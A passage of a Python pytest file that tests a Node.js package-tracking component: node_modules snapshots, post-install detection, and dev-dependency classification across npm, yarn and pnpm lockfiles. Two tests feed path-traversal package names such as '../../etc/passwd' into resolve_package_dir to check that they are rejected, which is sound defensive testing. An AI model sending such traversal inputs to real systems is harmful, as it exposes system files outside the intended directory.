    # Take post-snapshot
    after = lang.snapshot(tmp_path)
    assert str(express_dir) in after.data

    new_pkgs = lang.detect_post_install(before, after)
    assert any(p.name == "express" and p.version == "4.18.0" for p in new_pkgs)


def test_snapshot_with_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    babel_scope = node_modules / "@babel"
    babel_scope.mkdir()
    babel_core = babel_scope / "core"
    babel_core.mkdir()
    (babel_core / "package.json").write_text(
        json.dumps({"name": "@babel/core", "version": "7.22.0"})
    )

    snap = lang.snapshot(tmp_path)
    assert str(babel_core) in snap.data
    assert snap.data[str(babel_core)] == "7.22.0"


def test_detect_post_install_no_changes(lang: NodeLanguage, tmp_path: Path) -> None:
    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    express_dir = node_modules / "express"
    express_dir.mkdir()
    (express_dir / "package.json").write_text(
        json.dumps({"name": "express", "version": "4.18.0"})
    )

    before = lang.snapshot(tmp_path)
    after = lang.snapshot(tmp_path)

    new_pkgs = lang.detect_post_install(before, after)
    assert new_pkgs == []


def test_detect_post_install_ecosystem_is_npm(lang: NodeLanguage, tmp_path: Path) -> None:
    before = lang.snapshot(tmp_path)

    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    pkg_dir = node_modules / "lodash"
    pkg_dir.mkdir()
    (pkg_dir / "package.json").write_text(
        json.dumps({"name": "lodash", "version": "4.17.21"})
    )

    after = lang.snapshot(tmp_path)
    new_pkgs = lang.detect_post_install(before, after)
    assert all(p.ecosystem == "npm" for p in new_pkgs)


def test_detect_post_install_multiple_packages(lang: NodeLanguage, tmp_path: Path) -> None:
    before = lang.snapshot(tmp_path)

    node_modules = tmp_path / "node_modules"
    node_modules.mkdir()
    for pkg_name, version in [("express", "4.18.0"), ("lodash", "4.17.21"), ("axios", "1.5.0")]:
        pkg_dir = node_modules / pkg_name
        pkg_dir.mkdir()
        (pkg_dir / "package.json").write_text(
            json.dumps({"name": pkg_name, "version": version})
        )

    after = lang.snapshot(tmp_path)
    new_pkgs = lang.detect_post_install(before, after)
    names = {p.name for p in new_pkgs}
    assert names == {"express", "lodash", "axios"}


# ---------------------------------------------------------------------------
# top_packages_url / top_packages_fallback
# ---------------------------------------------------------------------------

def test_top_packages_url_is_string(lang: NodeLanguage) -> None:
    url = lang.top_packages_url()
    assert isinstance(url, str)
    assert url.startswith("https://")


def test_top_packages_fallback_is_nonempty_list(lang: NodeLanguage) -> None:
    fb = lang.top_packages_fallback()
    assert isinstance(fb, list)
    assert len(fb) > 0
    assert all(isinstance(n, str) for n in fb)


def test_top_packages_fallback_contains_known_packages(lang: NodeLanguage) -> None:
    fb = lang.top_packages_fallback()
    assert "lodash" in fb
    assert "express" in fb
    assert "react" in fb


# ---------------------------------------------------------------------------
# resolve_package_dir
# ---------------------------------------------------------------------------

def test_resolve_package_dir_plain_package(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_dir = tmp_path / "node_modules" / "lodash"
    pkg_dir.mkdir(parents=True)
    result = lang.resolve_package_dir("lodash", tmp_path, None)
    assert result == pkg_dir.resolve()


def test_resolve_package_dir_scoped_package(lang: NodeLanguage, tmp_path: Path) -> None:
    pkg_dir = tmp_path / "node_modules" / "@babel" / "core"
    pkg_dir.mkdir(parents=True)
    result = lang.resolve_package_dir("@babel/core", tmp_path, None)
    assert result == pkg_dir.resolve()


def test_resolve_package_dir_rejects_traversal(lang: NodeLanguage, tmp_path: Path) -> None:
    result = lang.resolve_package_dir("../../etc/passwd", tmp_path, None)
    assert result is None


def test_resolve_package_dir_rejects_traversal_in_scoped(lang: NodeLanguage, tmp_path: Path) -> None:
    result = lang.resolve_package_dir("@scope/../../../etc", tmp_path, None)
    assert result is None


def test_resolve_package_dir_rejects_extra_slashes(lang: NodeLanguage, tmp_path: Path) -> None:
    result = lang.resolve_package_dir("a/b/c", tmp_path, None)
    assert result is None


def test_resolve_package_dir_no_project_path(lang: NodeLanguage) -> None:
    assert lang.resolve_package_dir("lodash", None, None) is None


def test_resolve_package_dir_dotdot_without_separator_accepted(lang: NodeLanguage, tmp_path: Path) -> None:
    """'some..pkg' contains '..' but no separator — not a traversal risk, must not be rejected."""
    pkg_dir = tmp_path / "node_modules" / "some..pkg"
    pkg_dir.mkdir(parents=True)
    result = lang.resolve_package_dir("some..pkg", tmp_path, None)
    assert result == pkg_dir.resolve()


# ---------------------------------------------------------------------------
# is_dev
# ---------------------------------------------------------------------------

def test_package_lock_v2_marks_dev_true(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "lockfileVersion": 2,
        "packages": {
            "": {"name": "my-app", "version": "1.0.0"},
            "node_modules/express": {"version": "4.18.0"},
            "node_modules/jest": {"version": "29.0.0", "dev": True},
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True


def test_package_lock_v1_marks_dev_from_devdependencies(lang: NodeLanguage, tmp_path: Path) -> None:
    lock_data = {
        "lockfileVersion": 1,
        "devDependencies": {"jest": "^29.0.0"},
        "dependencies": {
            "express": {"version": "4.18.0"},
            "jest": {"version": "29.0.0"},
        },
    }
    (tmp_path / "package-lock.json").write_text(json.dumps(lock_data))
    result = lang.parse_lockfile(tmp_path / "package-lock.json")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True


def test_yarn_lock_marks_dev_via_package_json(lang: NodeLanguage, tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"express": "^4.18.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True


def test_yarn_lock_transitive_deps_are_unknown(lang: NodeLanguage, tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"express": "^4.18.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n\n'
        # transitive of express — not listed in package.json
        'accepts@~1.3.8:\n'
        '  version "1.3.8"\n\n'
        # transitive of jest — also not in package.json
        'jest-circus@^29.0.0:\n'
        '  version "29.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True
    assert by_name["accepts"].is_dev is None      # transitive — unknown
    assert by_name["jest-circus"].is_dev is None  # transitive — unknown


def test_yarn_lock_no_package_json_all_unknown(lang: NodeLanguage, tmp_path: Path) -> None:
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    # No package.json — can't distinguish, all is_dev=None
    assert all(p.is_dev is None for p in result)


def test_pnpm_lock_marks_dev_from_importers(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      express:\n"
        "        specifier: ^4.18.0\n"
        "        version: 4.18.2\n"
        "    devDependencies:\n"
        "      jest:\n"
        "        specifier: ^29.0.0\n"
        "        version: 29.0.0\n\n"
        "packages:\n"
        "  express@4.18.2:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  jest@29.0.0:\n"
        "    resolution: {integrity: sha512-bbb}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["jest"].is_dev is True


def test_pnpm_lock_monorepo_does_not_leak_other_importer_dev_deps(lang: NodeLanguage, tmp_path: Path) -> None:
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      express:\n"
        "        specifier: ^4.18.0\n"
        "        version: 4.18.2\n\n"
        "  packages/app:\n"
        "    devDependencies:\n"
        "      jest:\n"
        "        specifier: ^29.0.0\n"
        "        version: 29.0.0\n\n"
        "packages:\n"
        "  express@4.18.2:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  jest@29.0.0:\n"
        "    resolution: {integrity: sha512-bbb}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    # express is a direct root prod dep — classified False
    assert by_name["express"].is_dev is False
    # jest is only a dev dep in packages/app (non-root importer); without snapshots:
    # it's unclassifiable from the root's perspective — None, not False
    assert by_name["jest"].is_dev is None


def test_pnpm_lock_graph_traversal_classifies_transitives(lang: NodeLanguage, tmp_path: Path) -> None:
    # With snapshots: section, transitive deps are classified via BFS.
    # express depends on accepts (prod transitive); jest depends on jest-circus (dev transitive).
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      express:\n"
        "        specifier: ^4.18.0\n"
        "        version: 4.18.2\n"
        "    devDependencies:\n"
        "      jest:\n"
        "        specifier: ^29.0.0\n"
        "        version: 29.0.0\n\n"
        "packages:\n"
        "  accepts@1.3.8:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  express@4.18.2:\n"
        "    resolution: {integrity: sha512-bbb}\n"
        "  jest@29.0.0:\n"
        "    resolution: {integrity: sha512-ccc}\n"
        "  jest-circus@29.0.0:\n"
        "    resolution: {integrity: sha512-ddd}\n\n"
        "snapshots:\n"
        "  accepts@1.3.8: {}\n"
        "  express@4.18.2:\n"
        "    dependencies:\n"
        "      accepts: 1.3.8\n"
        "  jest@29.0.0:\n"
        "    dependencies:\n"
        "      jest-circus: 29.0.0\n"
        "  jest-circus@29.0.0: {}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["accepts"].is_dev is False     # transitive of prod express
    assert by_name["jest"].is_dev is True
    assert by_name["jest-circus"].is_dev is True  # transitive of dev jest


def test_yarn_lock_graph_traversal_classifies_transitives(lang: NodeLanguage, tmp_path: Path) -> None:
    # With dependencies: in yarn.lock blocks, transitives are classified via BFS.
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"express": "^4.18.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'accepts@~1.3.8:\n'
        '  version "1.3.8"\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n'
        '  dependencies:\n'
        '    accepts "~1.3.8"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n'
        '  dependencies:\n'
        '    jest-circus "^29.0.0"\n\n'
        'jest-circus@^29.0.0:\n'
        '  version "29.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_name = {p.name: p for p in result}
    assert by_name["express"].is_dev is False
    assert by_name["accepts"].is_dev is False     # transitive of prod express
    assert by_name["jest"].is_dev is True
    assert by_name["jest-circus"].is_dev is True  # transitive of dev jest


def test_yarn_lock_shared_transitive_is_prod(lang: NodeLanguage, tmp_path: Path) -> None:
    # A package reachable from both prod and dev seeds is prod (conservative).
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"express": "^4.18.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        'debug@^4.0.0:\n'
        '  version "4.3.4"\n\n'
        'express@^4.18.0:\n'
        '  version "4.18.2"\n'
        '  dependencies:\n'
        '    debug "^4.0.0"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n'
        '  dependencies:\n'
        '    debug "^4.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_name = {p.name: p for p in result}
    assert by_name["debug"].is_dev is False  # reachable from both — conservative: prod


def test_pnpm_lock_scoped_importer_deps_unquoted(lang: NodeLanguage, tmp_path: Path) -> None:
    # pnpm quotes scoped package names in importers: (e.g. '@babel/core':).
    # Seed names must be stripped of quotes so they match the unquoted package names.
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      '@babel/core':\n"
        "        specifier: ^7.0.0\n"
        "        version: 7.22.0\n"
        "    devDependencies:\n"
        "      '@types/node':\n"
        "        specifier: ^18.0.0\n"
        "        version: 18.0.0\n\n"
        "packages:\n"
        "  '@babel/core@7.22.0':\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  '@types/node@18.0.0':\n"
        "    resolution: {integrity: sha512-bbb}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    assert by_name["@babel/core"].is_dev is False
    assert by_name["@types/node"].is_dev is True


def test_pnpm_lock_snapshot_dep_peer_suffix_stripped(lang: NodeLanguage, tmp_path: Path) -> None:
    # Snapshot dep versions can include peer metadata suffixes like "1.0.0(react@18.2.0)".
    # These must be stripped when building the adjacency map so BFS edges resolve correctly.
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      react-dom:\n"
        "        specifier: ^18.2.0\n"
        "        version: 18.2.0(react@18.2.0)\n\n"
        "packages:\n"
        "  react@18.2.0:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  react-dom@18.2.0:\n"
        "    resolution: {integrity: sha512-bbb}\n\n"
        "snapshots:\n"
        "  react@18.2.0: {}\n"
        "  react-dom@18.2.0(react@18.2.0):\n"
        "    dependencies:\n"
        "      react: 18.2.0\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_name = {p.name: p for p in result}
    assert by_name["react-dom"].is_dev is False
    assert by_name["react"].is_dev is False  # transitive of prod react-dom


def test_yarn_lock_multi_version_uses_range_to_resolve_seed(lang: NodeLanguage, tmp_path: Path) -> None:
    # When two versions of the same package exist in yarn.lock, the seed lookup
    # must use (name, range) from package.json to pin the correct entry, not
    # match by name alone (which would reach both versions).
    (tmp_path / "package.json").write_text(json.dumps({
        "dependencies": {"debug": "^3.0.0"},
        "devDependencies": {"jest": "^29.0.0"},
    }))
    (tmp_path / "yarn.lock").write_text(
        '# yarn lockfile v1\n\n'
        # prod dep: debug ^3 resolves to 3.2.7
        'debug@^3.0.0:\n'
        '  version "3.2.7"\n\n'
        # dev transitive: jest pulls debug ^4, which resolves to 4.3.4
        'debug@^4.0.0:\n'
        '  version "4.3.4"\n\n'
        'jest@^29.0.0:\n'
        '  version "29.0.0"\n'
        '  dependencies:\n'
        '    debug "^4.0.0"\n'
    )
    result = lang.parse_lockfile(tmp_path / "yarn.lock")
    by_version = {p.version: p for p in result if p.name == "debug"}
    # debug@3.2.7 is a direct prod dep
    assert by_version["3.2.7"].is_dev is False
    # debug@4.3.4 is only reachable from dev jest, not from any prod seed
    assert by_version["4.3.4"].is_dev is True


def test_pnpm_lock_multi_version_uses_exact_seed_version(lang: NodeLanguage, tmp_path: Path) -> None:
    # When multiple versions of the same package exist, importers['.'].version
    # must be used to seed BFS with the exact (name, version) node, not match by
    # name alone (which would incorrectly reach all versions).
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      debug:\n"
        "        specifier: ^3.0.0\n"
        "        version: 3.2.7\n"
        "    devDependencies:\n"
        "      jest:\n"
        "        specifier: ^29.0.0\n"
        "        version: 29.0.0\n\n"
        "packages:\n"
        "  debug@3.2.7:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  debug@4.3.4:\n"
        "    resolution: {integrity: sha512-bbb}\n"
        "  jest@29.0.0:\n"
        "    resolution: {integrity: sha512-ccc}\n\n"
        "snapshots:\n"
        "  debug@3.2.7: {}\n"
        "  debug@4.3.4: {}\n"
        "  jest@29.0.0:\n"
        "    dependencies:\n"
        "      debug: 4.3.4\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_version = {(p.name, p.version): p for p in result}
    # debug@3.2.7 is the direct prod dep seed
    assert by_version[("debug", "3.2.7")].is_dev is False
    # debug@4.3.4 is only reachable from dev jest — must not be pulled in as prod
    assert by_version[("debug", "4.3.4")].is_dev is True


def test_pnpm_lock_no_snapshots_same_name_prod_and_dev_different_versions(lang: NodeLanguage, tmp_path: Path) -> None:
    # Without snapshots:, when the same package name appears in both prod and dev
    # seeds at different versions, each version must be classified by its exact
    # resolved version, not just by name membership.
    pnpm_lock = tmp_path / "pnpm-lock.yaml"
    pnpm_lock.write_text(
        "lockfileVersion: '9.0'\n\n"
        "importers:\n"
        "  .:\n"
        "    dependencies:\n"
        "      debug:\n"
        "        specifier: ^3.0.0\n"
        "        version: 3.2.7\n"
        "    devDependencies:\n"
        "      debug:\n"
        "        specifier: ^4.0.0\n"
        "        version: 4.3.4\n\n"
        "packages:\n"
        "  debug@3.2.7:\n"
        "    resolution: {integrity: sha512-aaa}\n"
        "  debug@4.3.4:\n"
        "    resolution: {integrity: sha512-bbb}\n"
    )
    result = lang.parse_lockfile(pnpm_lock)
    by_version = {(p.name, p.version): p for p in result}
    assert by_version[("debug", "3.2.7")].is_dev is False
    assert by_version[("debug", "4.3.4")].is_dev is True
